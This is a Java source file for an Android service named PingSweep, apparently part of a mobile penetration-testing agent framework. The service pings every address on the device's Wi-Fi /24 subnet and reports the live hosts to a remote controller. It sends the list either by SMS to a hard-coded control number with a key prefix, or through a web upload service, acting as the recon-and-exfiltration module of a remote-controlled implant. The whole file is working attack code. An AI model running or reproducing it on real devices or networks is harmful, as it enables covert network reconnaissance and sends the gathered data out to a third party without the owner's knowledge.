package com.bulbsecurity.framework;

import java.io.IOException;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.UnknownHostException;
import java.util.Collections;
import java.util.Enumeration;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.IBinder;
import android.provider.Contacts.People;
import android.util.Log;

public class PingSweep extends Service {

	@Override
	public void onCreate() {
		
		
	}
	
	
	
	@Override
	public void onStart(Intent intent, int startID) {
		 Log.i("AAA", "started ping");
		final String ret = intent.getStringExtra("returnmethod");
		final String sms = "SMS";
		final String web = "WEB";
		new Thread() {
			public void run() {
				 Log.i("AAA", "started thread");
		String liveips = "Live IPs:";
		ConnectivityManager connManager = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
		NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

		if (mWifi.isConnected()) {
			 Log.i("AAA", "wifi connected");
		WifiManager myWifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
		WifiInfo myWifiInfo = myWifiManager.getConnectionInfo();
		int ip = myWifiInfo.getIpAddress();
		 String myip = String.format("%d.%d.%d.%d",(ip & 0xff),(ip >> 8 & 0xff),(ip >> 16 & 0xff),(ip >> 24 & 0xff));
		 Log.i("AAA", myip);
		String[] seperated = myip.split("\\.");
		String twentyfour = seperated[0].concat(".").concat(seperated[1]).concat(".").concat(seperated[2]).concat(".");
		for (int i=1; i<255; i++)
		{
			String fullip = twentyfour.concat(String.valueOf(i));
			 Log.i("AAA", fullip);
			InetAddress toping=null;
			try {
				 toping = InetAddress.getByName(fullip);
	        } catch (UnknownHostException e) {
	            // TODO Auto-generated catch block
	            e.printStackTrace();
	       }
			try {
	           if (toping.isReachable(500)) {
	               liveips = liveips.concat(toping.toString());
	            } 
	        } catch (IOException e) {
	            // TODO Auto-generated catch block
	        	 e.printStackTrace();
	       }
	}
		}
		else {
			 Log.i("AAA", "wifi not connected");
			liveips = liveips.concat(" Wifi Not Connected");
		}
		if (ret != null)
		{
			 Log.i("AAA", "ret exists");
			if (ret.equals(sms))
			{

				Intent intent3 = new Intent(getApplicationContext(), SMSService.class);
				//String number2 = ((AndroidAgent)this.getApplication()).getcontrolNumber();
				//String key = ((AndroidAgent)this.getApplication()).getkey();
			String key = getApplicationContext().getResources().getString(R.string.key);
			String number2 = getApplicationContext().getResources().getString(R.string.controlnumber);
			String first = key.concat(" ");
			String liveipss = first.concat(liveips);
			intent3.putExtra("number", number2);
			intent3.putExtra("message", liveipss);
				Context context = getApplicationContext();
			context.startService(intent3);
				
			}
			else if (ret.equals(web))
			{
				Intent intent2 = new Intent(getApplicationContext(), WebUploadService.class);
				intent2.putExtra("uploadstring", liveips);
			Context context = getApplicationContext();
				context.startService(intent2);
			}

		}
	
		};
	}.start();
	}
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}

}
